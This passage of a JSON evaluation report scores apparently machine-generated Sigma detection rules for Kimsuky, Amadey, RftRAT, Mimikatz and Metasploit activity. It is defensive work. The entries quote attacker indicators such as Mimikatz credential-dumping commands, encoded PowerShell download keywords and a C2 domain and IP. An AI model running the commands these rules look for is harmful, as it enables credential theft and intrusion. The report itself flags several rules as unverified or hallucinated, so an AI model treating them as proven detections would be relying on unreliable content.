          "Includes reasonable false positive exclusions in documentation",
          "Aligned with MITRE ATT&CK technique T1056.001 (Keylogger)"
        ],
        "weaknesses": [
          "No real-world verification performed, so detection efficacy is unproven",
          "Relies on exact command-line keyword matching (e.g., 'keylogger', 'Get-Keystrokes') which attackers can easily obfuscate",
          "No use of regex or base64 decoding to detect obfuscated payloads",
          "Rule may miss novel or polymorphic variants of keylogger execution"
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to verify detection capability",
          "Enhance detection logic with regular expressions to catch obfuscated command lines (e.g., base64-encoded, split strings)",
          "Add process ancestry heuristics (e.g., child of Office apps, browsers) to improve context and reduce false positives",
          "Include file hash or image load detections if known malware artifacts exist for Kimsuky keyloggers",
          "Consider adding network indicators if available in future versions"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Amadey Malware Process Injection via Rundll32 and IEXPLORE",
        "rule_id": "ec4e501b-3a4f-4c3e-b635-4a4ba1dfeed6",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets a specific and suspicious parent-child process chain involving rundll32.exe and iexplore.exe, which aligns with known Amadey behavior",
          "Condition logic is straightforward and uses endswith for robust path matching, reducing noise from full path variations",
          "Includes relevant MITRE ATT&CK tags (T1055 - Process Injection), improving threat context",
          "Acknowledges potential false positives and documents them explicitly in the falsepositives list"
        ],
        "weaknesses": [
          "No real-world verification was performed, so effectiveness against actual Amadey activity is unproven",
          "Rule may not accurately reflect the true Amadey execution chain; using svchost.exe as a child process from iexplore.exe is atypical and could be a hallucination",
          "Relies on iexplore.exe (Internet Explorer) being spawned by rundll32.exe, which is rare in modern environments and may limit detection coverage",
          "The TTP ID is listed as 'unknown' and tactic is missing, reducing integration value with threat intelligence platforms"
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to verify detection capability against actual Amadey samples",
          "Re-evaluate the selection_child condition; consider removing or adjusting svchost.exe requirement if not consistently present in Amadey behavior",
          "Enhance detection logic with command-line arguments or image load conditions (e.g., suspicious DLL loads via rundll32) to increase specificity",
          "Add additional context such as command-line monitoring or network connections to improve coverage and reduce false positives",
          "Update TTP metadata with correct MITRE ATT&CK tactic (e.g., Execution or Defense Evasion) and verify technique ID"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Kimsuky Group Data Exfiltration via RDP or Chrome Remote Desktop",
        "rule_id": "91b755fd-be4a-4f79-bb33-191d1cbffbad",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule targets known process creation events for RDP (mstsc.exe) and Chrome Remote Desktop, which are relevant to remote access and potential data exfiltration",
          "Uses Sysmon process creation logs, which provide detailed visibility into execution patterns",
          "Includes specific command-line arguments (e.g., /v:, /admin, --remote-desktop-host) that help distinguish suspicious usage from benign",
          "Tags are well-aligned with MITRE ATT&CK (T1041) and threat actor (Kimsuky), improving contextual relevance",
          "False positives are acknowledged and documented, showing awareness of operational impact"
        ],
        "weaknesses": [
          "No real-world verification was performed, so detection efficacy is unproven \u2014 this directly impacts confidence in detection coverage",
          "Relies solely on command-line arguments which can be easily obfuscated or modified by adversaries",
          "Chrome Remote Desktop detection may be too generic; legitimate users may trigger it",
          "No network connection or data transfer correlation (e.g., large outbound traffic after RDP session) to strengthen exfiltration context",
          "Rule does not include other potential indicators of Kimsuky (e.g., known C2 patterns, scheduled tasks, lateral movement)"
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to verify detection capability and tune the rule based on results",
          "Enrich the rule with additional behavioral context such as network connections, file access before RDP, or large data transfers",
          "Consider adding host-based indicators like session duration, unusual login times, or use after file enumeration activity",
          "Improve specificity for Chrome Remote Desktop by checking parent process or user context (e.g., non-interactive sessions)",
          "Add suppression logic or thresholds (e.g., multiple RDP connections in short time) to reduce false positives"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Amadey Domain Generation Algorithm (DGA) Activity",
        "rule_id": "4e23a34d-5d55-4b3d-b596-7f8e5c6721ad",
        "quality_score": 0.525,
        "status": "fail",
        "strengths": [
          "Focuses on behavioral indicators of DGA activity, which is aligned with the TTP",
          "Targets suspicious parent processes commonly abused by malware",
          "Includes relevant tags and MITRE ATT&CK mapping for context",
          "Acknowledges potential false positives in documentation"
        ],
        "weaknesses": [
          "Detection logic is incomplete or potentially hallucinated: 'DestinationHostname|contains' has an empty string value, which will match everything",
          "Rule lacks specificity: requiring only a 12-character hostname is insufficient to identify DGA domains",
          "No real-world verification performed, so effectiveness is unknown",
          "Missing critical fields such as ProcessGuid or SourceIp for correlation",
          "Contains no actual DGA pattern or regex, reducing detection accuracy"
        ],
        "suggestions": [
          "Implement regex pattern matching on DestinationHostname to detect algorithmic DGA characteristics (e.g., high entropy, repetitive patterns)",
          "Add validation to selection_behavior with non-empty 'contains' or use 'matches' with a regex",
          "Include additional telemetry like DNS query type or response code from DNS logs if available",
          "Require high-entropy hostnames (e.g., via regex or calculated field)",
          "Verify rule in a test environment with known Amadey traffic or DGA samples",
          "Add ProcessGuid to improve event correlation and reduce spoofing risk",
          "Refine process whitelist to exclude known benign behaviors of listed binaries"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.5,
          "efficiency": 0.7,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Phishing Activity via Office Process Spawning Command Shell",
        "rule_id": "162bfcd7-56f6-457f-b404-ae60d7041197",
        "quality_score": 0.725,
        "status": "pass",
        "strengths": [
          "The rule targets a well-known post-exploitation behavior (Office spawning command shells), which is a common pattern in phishing follow-on activity.",
          "Detection logic is clear and uses specific process paths via 'endswith', reducing ambiguity.",
          "Log source is appropriate (Sysmon process creation on Windows), enabling reliable data context.",
          "Rule includes relevant MITRE ATT&CK tags (T1566 - Phishing), improving threat alignment.",
          "Condition logic is simple and efficient: two clean selections combined with 'and', which is performant in most SIEMs."
        ],
        "weaknesses": [
          "Real-world verification was not performed, so actual detection capability is unproven \u2014 this introduces uncertainty in effectiveness.",
          "False positives are acknowledged (e.g., admin scripts, enterprise tools), indicating potential noise in real environments.",
          "Rule does not include additional context such as command-line arguments, which could improve precision.",
          "The TTP ID is listed as 'unknown' and tactic is missing, reducing traceability to MITRE framework.",
          "Rule was generated via 'langchain', suggesting possible synthetic origin \u2014 raises concern about real-world validation."
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to validate detection capability and reduce uncertainty.",
          "Enhance detection logic by adding command-line inspection (e.g., suspicious scripts, encoded commands) to improve precision.",
          "Add filtering for known benign parent-child relationships (e.g., approved management tools) to reduce false positives.",
          "Include additional child processes like 'wscript.exe', 'cscript.exe', or 'mshta.exe' to improve coverage of common phishing execution chains.",
          "Populate missing TTP metadata (tactic, technique ID) accurately using MITRE ATT&CK framework (e.g., TA0001 for Initial Access).",
          "Document and baseline legitimate use cases to support tuning and alert triage in production environments."
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.8,
          "efficiency": 0.9,
          "maintainability": 0.7
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "AutoIt Masquerading Detection",
        "rule_id": "7a1d4505-f1c8-4e89-9751-202db403d4c7",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule targets known AutoIt executables and common command-line indicators for script execution",
          "Includes context about parent processes that are typically associated with suspicious activity (e.g., explorer.exe, svchost.exe)",
          "Well-documented false positives, which aids in tuning and operational awareness",
          "Aligned with MITRE ATT&CK technique T1036 (Masquerading)"
        ],
        "weaknesses": [
          "No real-world verification performed, so effectiveness against actual attacks is unproven",
          "Relies on command-line arguments like '-' and '.a3x'/.au3 which may be easily modified or obfuscated by adversaries",
          "Potential for false positives due to legitimate AutoIt usage by admins/developers, despite noted FP sources",
          "Lack of additional constraints (e.g., command-line length, presence of encoded strings) reduces precision"
        ],
        "suggestions": [
          "Conduct real-world testing or emulation to verify detection capability and refine logic",
          "Enhance detection logic with additional indicators such as suspicious child processes, network connections, or use of obfuscation patterns in command line",
          "Add file hash monitoring or digital signature checks to distinguish signed legitimate tools from malicious ones",
          "Consider adding data models or behavioral analytics to reduce reliance on easily altered command-line artifacts"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "RftRAT Packed with VMP Containing Decrypted String RFTServer",
        "rule_id": "70e2ff39-3e48-4c0a-a1c3-645a1d949c06",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule targets a specific malware (RftRAT) with a clear behavioral indicator (presence of 'RFTServer' string)",
          "Uses relevant Sysmon process creation data, which is standard for detection engineering",
          "Includes known false positives in the rule metadata, showing awareness of potential noise",
          "Maps to MITRE ATT&CK technique T1027 (Obfuscated Files or Information), aligning with standard threat modeling"
        ],
        "weaknesses": [
          "No real-world verification performed \u2014 detection capability is unproven",
          "Detection logic may be too broad: 'CommandLine|contains RFTServer' could miss obfuscated variants or trigger on benign matches",
          "Relies on exact string match in command line, which malware can easily modify to evade",
          "Selection condition uses OR logic between image and command line, increasing false positive surface without correlation"
        ],
        "suggestions": [
          "Perform real-world testing or simulation to verify detection efficacy",
          "Enhance detection logic with additional context (e.g. parent-child process anomalies, network connections)",
          "Consider using regex or base64 decoding patterns to catch obfuscated variants of 'RFTServer'",
          "Strengthen correlation by requiring both image and command line indicators (AND condition) or adding process ancestry checks",
          "Improve completeness by specifying required fields like User, Hostname, or hashes if available"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "RftRAT Data Exfiltration via C2 Communication and Local File Creation",
        "rule_id": "81c38236-eece-48e1-82ca-f5177cc57ef0",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule combines file creation and network communication, aligning with multi-stage detection best practices",
          "Specific file path and URL pattern increase precision for targeted detection",
          "False positives are thoughtfully considered and documented",
          "Uses Sysmon file event category, which is appropriate for file-based detection"
        ],
        "weaknesses": [
          "No real-world verification performed \u2014 detection coverage cannot be confirmed",
          "Rule includes specific domain 'prohomepage.net' not confirmed in TTP context (potential hallucination)",
          "Condition requires both file and network events to correlate, but no time window or session context is defined, risking missed detections",
          "Detection logic may not account for domain/IP changes in real-world C2 infrastructure"
        ],
        "suggestions": [
          "Perform real-world testing or simulation to verify detection efficacy",
          "Replace hardcoded domain with a broader indicator pattern or threat intel feed if possible",
          "Add time correlation (e.g., 5-minute window) between file creation and network event",
          "Include process context (e.g., ParentImage, Image) to reduce false positives and improve accuracy",
          "Use lookups or reference data for known-bad domains to improve maintainability and coverage"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Keylogging Malware Execution from Startup Directory",
        "rule_id": "0624fcda-5b0e-446f-aeae-7893d6e3e163",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "Specific path indicators reduce noise",
          "Targets known malicious behavior (execution from startup directory)",
          "Includes relevant MITRE ATT&CK tagging for credential access and keylogging",
          "Condition logic separates distinct detection paths"
        ],
        "weaknesses": [
          "No real-world verification performed, so effectiveness is unproven",
          "Detection condition uses 'and' and 'or' without proper grouping, leading to potential logic errors",
          "Contains a likely hallucinated file path: '%ALLUSERSPROFILE%\\semantec\\av\\C_1025.nls' \u2014 no evidence this is associated with keylogging TTPs",
          "Ambiguous TTP mapping with 'unknown' technique ID and empty tactic"
        ],
        "suggestions": [
          "Perform real-world testing or simulation to verify detection capability",
          "Fix condition logic by using explicit parentheses, e.g., '(selection_nsi_service and selection_startup_path) or selection_semantec_av'",
          "Remove or validate the suspicious 'semantec' file path \u2014 currently appears to be a hallucination",
          "Populate missing TTP information (tactic, technique ID) using MITRE ATT&CK framework",
          "Consider adding command-line arguments or parent-process context to improve precision"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.6,
          "efficiency": 0.7,
          "maintainability": 0.8
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Mimikatz Execution Detection",
        "rule_id": "dc74195f-24ef-472a-b016-812c33349c9e",
        "quality_score": 0.7,
        "status": "pass",
        "strengths": [
          "The rule uses specific command-line indicators commonly associated with Mimikatz, such as 'privilege::debug' and 'sekurlsa::logonpasswords', which are strong behavioral signatures.",
          "Multiple detection paths (name-based, standard usage, in-memory execution) increase the likelihood of catching different variants of Mimikatz execution.",
          "The rule leverages Sysmon process creation logs, which provide rich telemetry for detecting suspicious command-line activity.",
          "False positives are reasonably considered, with acknowledgment of authorized use cases like red teaming."
        ],
        "weaknesses": [
          "No real-world verification was performed, so the actual detection capability is unproven; this directly impacts detection coverage.",
          "Relies heavily on command-line patterns that could be obfuscated or altered by attackers (e.g., case variation, spacing, encoding), leading to potential evasion.",
          "The 'mimikatz' string in Image or CommandLine can be easily renamed or misspelled to bypass detection.",
          "No normalization (e.g., case-insensitive matching) is enforced in the Sigma logic, increasing the risk of missing obfuscated variants."
        ],
        "suggestions": [
          "Conduct real-world testing with known Mimikatz executions to validate detection efficacy.",
          "Enhance pattern matching with case-insensitive modifiers (e.g., '|i') and consider regex patterns to detect obfuscation.",
          "Add additional context such as parent-child process anomalies (e.g., mimikatz spawned by PowerShell or rundll32).",
          "Include network indicators or file creation events if available to improve detection resilience.",
          "Document and test alternative execution methods (e.g., reflective loading, PowerShell in-memory) to expand coverage beyond command-line artifacts."
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.7
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Rundll32 Used for Defense Evasion",
        "rule_id": "ee2b2e68-95ee-4429-8def-94bf3b2df1b3",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets a known defense evasion technique using rundll32.exe, which is a legitimate TTP associated with threat actors like Kimsuky",
          "Uses Sysmon process creation data, which provides detailed command-line visibility",
          "Includes multiple detection conditions (t1-t4) to capture various suspicious argument patterns such as backslashes, colons, forward slashes, and hyphens",
          "Acknowledges legitimate use cases in false positives list, showing awareness of operational impact"
        ],
        "weaknesses": [
          "No real-world verification was performed, so detection efficacy is unproven",
          "The detection logic is overly broad \u2014 matching any command line with \\, :, /, or - could trigger on normal system usage",
          "Lacks specificity to Kimsuky or any known malicious command-line patterns (e.g., URLs, specific DLLs, obfuscation)",
          "No use of parent-child process context (e.g., rundll32 spawned by Office apps), which is common in attacks",
          "No mention of command-line length, encoding, or known malicious arguments that would increase confidence"
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to verify detection capability",
          "Refine detection logic using known malicious patterns (e.g., URLs in command line, specific DLL exports like DllRegisterServer)",
          "Add process ancestry conditions (e.g., parent process not explorer.exe or svchost.exe) to reduce false positives",
          "Incorporate command-line length thresholds or base64/script-like patterns to detect obfuscation",
          "Leverage Sigma's field mapping correctly \u2014 ensure CommandLine, Image are properly normalized in the target SIEM",
          "If targeting Kimsuky specifically, align with documented TTPs from trusted sources (e.g., Mandiant, CrowdStrike) and include indicators if available"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Amadey Data Encoding via HTTP",
        "rule_id": "6b838961-b6a8-467f-9acb-e8761043452c",
        "quality_score": 0.525,
        "status": "fail",
        "strengths": [
          "Focuses on behavioral indicators of data exfiltration via encoded content",
          "Clear mapping to MITRE ATT&CK technique T1132 (Data Encoding)",
          "Includes relevant false positives in metadata for analyst context",
          "Uses specific process names commonly abused in malicious activity"
        ],
        "weaknesses": [
          "Rule logic mismatch: correlates network connection fields (DestinationPort, Protocol) with process image/command line, which are not typically available in network logs",
          "High potential for false negatives due to overly restrictive process list (lsass, svchost, winlogon) for HTTP-based exfiltration",
          "No real-world verification performed, reducing confidence in detection efficacy",
          "Contains potential hallucinations: references command-line parameters (-enc, /encodedcommand) in network logs, which are not present in network traffic data"
        ],
        "suggestions": [
          "Revise detection logic to use only fields available in network logs (e.g., URL patterns, HTTP headers, User-Agent, host behavior)",
          "Add indicators such as suspicious URI patterns, known Amadey C2 path structures, or entropy-based detection for encoded data in HTTP requests",
          "Validate rule in a test environment with simulated Amadey traffic to confirm detection capability",
          "Improve completeness by specifying required log fields and data sources explicitly",
          "Consider using proxy or firewall logs instead of process logs for network-based detection"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.6,
          "efficiency": 0.7,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Metasploit Execution via Process Creation",
        "rule_id": "9f9640dc-fbf9-42f3-857c-da21f00cab33",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule targets known Metasploit-related command-line indicators, which are commonly used during exploitation.",
          "It leverages Sysmon process creation logs, which provide detailed visibility into process execution on Windows systems.",
          "The inclusion of multiple scripting interpreters (ruby.exe, python.exe, etc.) increases relevance since Metasploit often runs under these runtimes.",
          "False positives are reasonably considered, including legitimate pentesting and dev/admin use."
        ],
        "weaknesses": [
          "Detection coverage is limited due to lack of real-world verification \u2014 no events were detected, indicating potential ineffectiveness in practice.",
          "The rule relies solely on command-line string matching, which is easily evaded via obfuscation or alternative execution methods.",
          "No use of parent-child process relationships or network indicators that could strengthen detection logic.",
          "The TTP ID is listed as 'unknown', suggesting incomplete mapping to known adversary behavior.",
          "Rule may miss Metasploit usage via compiled payloads (e.g., msfvenom binaries) that don't invoke interpreters.",
          "No mention of specific IPs, domains, or hashes from known Metasploit C2 traffic, but none are hallucinated either."
        ],
        "suggestions": [
          "Conduct real-world testing or emulate Metasploit execution in a controlled environment to validate detection capability.",
          "Enhance detection logic with parent process anomalies (e.g., Office apps spawning python/ruby).",
          "Add file path heuristics (e.g., suspicious temp directory usage) to reduce false positives.",
          "Incorporate network connection events correlated with process creation for higher confidence alerts.",
          "Map the rule to a valid MITRE ATT&CK technique ID (e.g., T1059 for command and scripting interpreter use).",
          "Consider using Sigma's field name aliases or backend-specific optimizations to improve cross-platform performance."
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Kimsuky Group PowerShell Execution",
        "rule_id": "72001a16-0771-421c-816c-7e2fc84a9649",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule targets known malicious PowerShell behaviors commonly associated with adversary tradecraft",
          "Includes relevant command-line indicators such as '-enc', 'IEX', 'DownloadString', which are strong signals of malicious intent",
          "Leverages Sysmon process creation logs, which provide detailed visibility into execution chains",
          "Tags align with MITRE ATT&CK (T1059.001), improving threat context and correlation potential",
          "Acknowledges legitimate use cases in false positives list, showing awareness of operational impact"
        ],
        "weaknesses": [
          "No real-world verification performed \u2014 rule effectiveness is unproven in practice",
          "Detection coverage score reduced due to lack of verification; per instructions, cannot score above 5 without confirmation",
          "Broad selection logic may trigger on benign automation tools or admin scripts, increasing false alarm risk",
          "Does not include file hash, parent process, or network indicators that could strengthen precision",
          "Rule generated via 'langchain' \u2014 potential for hallucinated logic or incomplete coverage"
        ],
        "suggestions": [
          "Conduct real-world testing using controlled Kimsuky-like PowerShell executions to validate detection capability",
          "Narrow detection scope by adding conditions (e.g., parent process = 'mshta.exe' or 'rundll32.exe') to reduce false positives",
          "Consider splitting into multiple rules: one for high-fidelity IOCs (e.g., -enc + IEX), another for lower-severity anomalies",
          "Enrich with additional context such as user context, image path, or network connections if available",
          "Replace 'unknown' TTP ID with accurate MITRE technique ID (T1059.001) for completeness and integration with threat intel platforms"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "RftRAT C2 Communication and Persistence",
        "rule_id": "e07d4865-cca3-41a9-80b5-9f9e06084209",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets specific indicators associated with RftRAT, including a known C2 domain and IP, which can enable quick detection if those IOCs are active",
          "Includes multiple detection paths (domain, IP, and file creation with cmd.exe), increasing chances of catching variants",
          "Leverages Sysmon logs, which provide detailed visibility into network connections and process command lines",
          "False positives are reasonably considered and documented, showing awareness of operational context"
        ],
        "weaknesses": [
          "No real-world verification was performed, so effectiveness in production is unproven",
          "The rule relies on hardcoded indicators (e.g., 'prohomepage.net', '45.76.93.204') that may not be present in the actual TTP description (hallucinated IOCs?)",
          "Detection logic is broad (OR condition across disparate events), increasing risk of false positives",
          "No correlation between network connection and file creation, potentially alerting on benign activity"
        ],
        "suggestions": [
          "Verify the rule in a test environment using known RftRAT traffic to confirm detection capability",
          "Replace hardcoded IOCs with threat intelligence feeds or generalize patterns (e.g., regex for suspicious domains)",
          "Strengthen correlation by requiring both network and file activity from the same process",
          "Add time-bounded condition to link C2 communication and persistence artifact creation",
          "Update TTP ID and technique name with valid MITRE ATT&CK identifiers if available"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Info Stealing Malware Dropped in ALLUSERSPROFILE Semantec Directory",
        "rule_id": "3f85a58e-ecbb-42b9-8d2b-8419b8acd757",
        "quality_score": 0.7,
        "status": "pass",
        "strengths": [
          "Specific detection logic targeting known malicious filenames (GBIA.exe, GBIC.exe)",
          "Uses precise path condition under %ALLUSERSPROFILE%\\semantec, which is unlikely for legitimate software",
          "Low expected false positive rate due to highly suspicious path and naming pattern",
          "Aligned with MITRE ATT&CK technique T1555 (Credential Access: Browsers)",
          "Efficient Sigma condition using simple 'or' logic with endswith for fast evaluation"
        ],
        "weaknesses": [
          "No real-world verification performed \u2014 detection capability is unproven in practice",
          "Detection coverage score reduced due to lack of verification (per critical rule)",
          "Path uses 'semantec' (misspelling of 'symantec'), but rule does not account for possible variants or adversary changes",
          "Rule may be evadable by renaming executable or changing drop location",
          "Relies on hardcoded filenames which may not persist across malware variants"
        ],
        "suggestions": [
          "Conduct real-world testing or emulation to verify detection efficacy",
          "Expand detection logic to include other suspicious filenames or hash indicators associated with the same malware family",
          "Add process command-line or parent-process conditions to reduce evasion opportunities",
          "Include file creation events (e.g., Sysmon Event ID 11) to detect the drop before execution",
          "Monitor for similar typosquatting paths (e.g., 'symantec', 'sementec') to improve coverage"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.9,
          "maintainability": 0.8
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Suspicious Process Injection via ipcheck.dll into Explorer and RuntimeBroker",
        "rule_id": "f415b722-43e2-4ca2-b3f1-f5f2eb9e8138",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "Specific focus on suspicious process injection using ipcheck.dll",
          "Clear detection logic with defined conditions for target processes and loaded module",
          "Includes relevant false positives in metadata, showing awareness of potential noise",
          "Efficient condition structure leveraging Sysmon process creation events"
        ],
        "weaknesses": [
          "Detection coverage is low due to lack of real-world verification; rule may not actually catch the intended TTP",
          "Relies on specific parent process path 'semantec\\taskhosts.exe' which appears to be a typo (likely meant 'symantec') and may not reflect real adversary behavior",
          "No verification performed \u2014 high risk of hallucinated or ineffective logic",
          "Specificity of 'ipcheck.dll' may limit coverage unless this DLL is consistently used in attacks"
        ],
        "suggestions": [
          "Conduct real-world testing or emulation to verify detection capability against known process injection techniques",
          "Correct potential typo in ParentImage condition: 'semantec' should likely be 'symantec' or validated against actual telemetry",
          "Broaden detection logic to include other known injection methods or suspicious parent processes if specific TTP is not confirmed",
          "Consider using additional indicators such as command-line arguments, image loaded hashes, or network connections to reduce false positives and improve confidence",
          "Update TTP ID and tactic information to align with MITRE ATT&CK for better context and coverage tracking"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Command and Scripting Interpreter - PowerShell and Metasploit Detection",
        "rule_id": "b0453951-c20a-4974-a81d-fc9acae6f145",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule targets known malicious indicators in PowerShell command-line arguments, such as '-enc', 'IEX', and 'DownloadString', which are commonly used in offensive operations.",
          "Includes detection logic for Metasploit tools (e.g., msfvenom, msfconsole) and payload-related command-line flags, aligning with adversarial behavior.",
          "Leverages Sysmon process creation events, which provide rich telemetry for execution monitoring.",
          "Explicitly documents false positives, aiding analysts in contextual interpretation."
        ],
        "weaknesses": [
          "No real-world verification was performed, so detection efficacy is unproven \u2014 this directly impacts confidence in coverage.",
          "Rule may generate false positives due to legitimate use of encoded commands or red teaming activities, despite documentation.",
          "No correlation or thresholding logic to reduce noise; single-event trigger increases alert fatigue risk.",
          "Relies solely on command-line patterns without behavioral context (e.g., parent process, network connection)."
        ],
        "suggestions": [
          "Conduct real-world testing using controlled execution of PowerShell and Metasploit payloads to validate detection capability.",
          "Add process ancestry or parent-child process checks (e.g., powershell.exe spawned by Office apps) to improve precision.",
          "Implement thresholding or correlation rules (e.g., multiple encoded command attempts) to reduce false positives.",
          "Consider enriching the rule with network connection conditions (e.g., outbound connection post-execution) for higher-fidelity detection.",
          "If specific IOCs were referenced but not present in TTP (none detected here), remove or justify them to avoid hallucinations."
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "PowerShell and Metasploit Command and Scripting Interpreter Detection",
        "rule_id": "02dc9374-ba43-4004-91c0-5babfc166a90",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule targets known malicious PowerShell command-line patterns such as encoded commands and execution policy bypass, which are commonly used in real attacks",
          "Includes detection logic for Metasploit artifacts, aligning with the use of offensive tools in post-exploitation",
          "Well-structured detection conditions that logically combine PowerShell execution with suspicious flags or Metasploit-related keywords",
          "Comprehensive false positive exclusions listed, showing awareness of operational environments where these commands may appear legitimately",
          "Tags align with MITRE ATT&CK framework (T1059), improving threat context and integration with threat intelligence"
        ],
        "weaknesses": [
          "No real-world verification was performed, so effectiveness in production is unproven",
          "Detection coverage is speculative due to lack of verification; per instructions, this necessitates a score below 5",
          "The rule may generate false positives in environments with legitimate PowerShell automation or authorized red teaming",
          "The condition logic could be improved to reduce ambiguity (e.g., operator precedence not explicitly grouped)",
          "No specific TTP ID or tactic provided in the target TTP, weakening alignment confidence"
        ],
        "suggestions": [
          "Perform real-world testing or simulation to verify detection capability and tune the rule based on actual telemetry",
          "Improve condition clarity by using sub-conditions with explicit grouping (e.g., (selection_powershell and selection_command_flags) or (selection_powershell and selection_metasploit))",
          "Add field mappings or normalization checks to ensure CommandLine and Image fields are consistently populated in the SIEM",
          "Consider adding user context, parent process, or image path to reduce false positives (e.g., filter out known management tools)",
          "Include additional Metasploit-specific indicators such as payload artifacts, named pipes, or common staging behaviors for stronger detection"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "RftRAT Command File Write to APPDATA",
        "rule_id": "5542a5d8-5861-459b-87f3-82143d64b633",
        "quality_score": 0.675,
        "status": "fail",
        "strengths": [
          "Specific file path targeting reduces noise",
          "Clear association with known malicious behavior (RftRAT)",
          "Efficient condition using simple string match on TargetFilename",
          "Relevant MITRE ATT&CK tagging (attack.execution, T1106)"
        ],
        "weaknesses": [
          "No real-world verification performed, so detection efficacy is unproven",
          "Detection logic relies solely on a single static file path, which is easily modifiable by adversaries",
          "Lack of process context (e.g. ParentImage, Image) increases risk of evasion",
          "Tags reference malware.rat.rfrat but TTP ID is 'unknown', indicating incomplete threat intel linkage"
        ],
        "suggestions": [
          "Add process-level context (e.g. Image, ParentImage) to strengthen detection fidelity",
          "Conduct real-world or lab-based verification to validate detection capability",
          "Consider using broader behavioral patterns (e.g. file writes in APPDATA with suspicious extensions or sequences)",
          "Update TTP ID if known; otherwise, remove or mark as pending",
          "Include additional indicators from RftRAT (e.g. registry modifications, network callbacks) for higher confidence detection"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.9,
          "maintainability": 0.8
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "UAC Bypass via ICMLuaUtil",
        "rule_id": "0d2ab478-514c-40e6-ad01-b4bf59e6a2ea",
        "quality_score": 0.7,
        "status": "pass",
        "strengths": [
          "Specific and targeted detection logic using known indicators (ICMLuaUtil.exe and LaunchAdvancedOptions)",
          "Uses Sysmon process creation logs, which are reliable for visibility into process execution",
          "Well-documented false positives, helping analysts with triage",
          "Aligned with MITRE ATT&CK techniques (T1548.002, T1088) for privilege escalation"
        ],
        "weaknesses": [
          "Lack of real-world verification reduces confidence in detection efficacy",
          "Detection logic may miss variations of UAC bypass using ICMLuaUtil with different command-line arguments",
          "No additional context or constraints (e.g., parent process, user context) to reduce potential false positives"
        ],
        "suggestions": [
          "Perform real-world testing or emulation to validate detection capability",
          "Enhance detection logic with additional context (e.g., parent process, user privilege level, image path integrity)",
          "Consider adding event correlation or behavioral chaining to distinguish malicious use from legitimate system usage",
